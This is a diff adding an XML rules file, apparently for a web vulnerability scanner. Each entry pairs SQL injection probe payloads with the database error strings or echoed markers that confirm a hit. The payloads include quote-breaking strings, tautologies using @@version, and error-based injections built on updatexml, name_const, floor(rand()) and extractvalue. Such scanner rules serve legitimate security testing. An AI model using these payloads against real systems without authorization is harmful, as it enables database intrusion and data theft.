@@ -1,0 +1,80 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rules>
+    <couple id="1">
+        <requests>
+            a%bf'%bf"
+        </requests>
+        <responses>
+            DB2
+            SQL Server
+            Access
+            Oracle
+            PostgreSQL
+            Mysql
+            Sybase
+            Syntax
+            Incorrect
+            ODBC Drivers
+            mssql_query\(\)
+            odbc_exec\(\)
+            Microsoft JET Database Engine
+            mysql_fetch_array\(\)
+            You have an error in your SQL syntax
+            java.sql.SQLException
+            PLS-[0-9][0-9][0-9][0-9]
+            ORA-[0-9][0-9][0-9][0-9]
+        </responses>
+    </couple>
+    <couple id="2">
+        <requests>
+            sql'%20'injection
+            sql"%20"injection
+            a'%2B(select/**/'test')%2B'a
+            test'|conv(hex('test'),16,10)|'
+        </requests>
+        <responses>
+            sqlinjection
+            74657374
+            1952805748
+        </responses>
+    </couple>
+    <couple id="3">
+        <requests>  
+            /**/or/**/1=@@version
+            a'/**/or/**/1=@@version/**/or'a'='
+            a"/**/or/**/1=@@version/**/or"a"="
+            a')/**/or/**/1=@@version/**/or('a'='
+            a")/**/or/**/1=@@version/**/or("a"="
+            1)/**/or/**/1=@@version/**/or(1
+            a%'/**/or/**/1=@@version/**/or'%a%'='%
+            a%"/**/or/**/1=@@version/**/or"%a%"="%
+            /**/or/**/updatexml(1,concat(0x7e,(SELECT/**/1234567890),0x7e),1)
+            a'or/**/updatexml(1,concat(0x7e,(SELECT/**/1234567890),0x7e),1)or'a'='
+            a')or/**/updatexml(1,concat(0x7e,(SELECT/**/1234567890),0x7e),1)or('a'='
+            a"or/**/updatexml(1,concat(0x7e,(SELECT/**/1234567890),0x7e),1)or"a"="
+            a")or/**/updatexml(1,concat(0x7e,(SELECT/**/1234567890),0x7e),1)or("a"="
+            1)or/**/updatexml(1,concat(0x7e,(SELECT md5(123)),0x7e),1)or(1
+            a%'or/**/updatexml(1,concat(0x7e,(SELECT/**/1234567890),0x7e),1)or'%a%'='%
+            a%"or/**/updatexml(1,concat(0x7e,(SELECT/**/1234567890),0x7e),1)or"%a%"="%
+            a%')or/**/updatexml(1,concat(0x7e,(SELECT/**/1234567890),0x7e),1)or('%a%'='%
+            /**/or(SELECT/**/*/**/FROM/**/(SELECT(name_const(1234567890,1)),name_const(1234567890,1))a)
+            a'or(SELECT/**/*/**/FROM/**/(SELECT(name_const(1234567890,1)),name_const(1234567890,1))a)or'a'='
+            a"or(SELECT/**/*/**/FROM/**/(SELECT(name_const(1234567890,1)),name_const(1234567890,1))a)or"a"="
+            a')or(SELECT/**/*/**/FROM/**/(SELECT(name_const(1234567890,1)),name_const(1234567890,1))a)or('a'='
+            a")or(SELECT/**/*/**/FROM/**/(SELECT(name_const(1234567890,1)),name_const(1234567890,1))a)or("a"="
+            1)or(SELECT/**/*/**/FROM/**/(SELECT(name_const(1234567890,1)),name_const(1234567890,1))a)or(1
+            a%'or(SELECT/**/*/**/FROM/**/(SELECT(name_const(1234567890,1)),name_const(1234567890,1))a)or'%a%'='%
+            a%"or(SELECT/**/*/**/FROM/**/(SELECT(name_const(1234567890,1)),name_const(1234567890,1))a)or"%a%"="%
+            a%')or(SELECT/**/*/**/FROM/**/(SELECT(name_const(1234567890,1)),name_const(1234567890,1))a)or('%a%')=('%
+            (SELECT 1 from (select count(*),concat(floor(rand(0)*2),(substring((select 1234567890),1,62)))a from information_schema.tables group by a)b)
+            procedure analyse((extractvalue(rand(),(select 1234567890))),1)—/**/-
+        </requests>
+        <responses>
+            1234567890
+            Microsoft SQL Server
+            Duplicate
+            mysql_fetch_array\(\)
+            You have an error in your SQL syntax
+        </responses>
+    </couple>
+</rules>
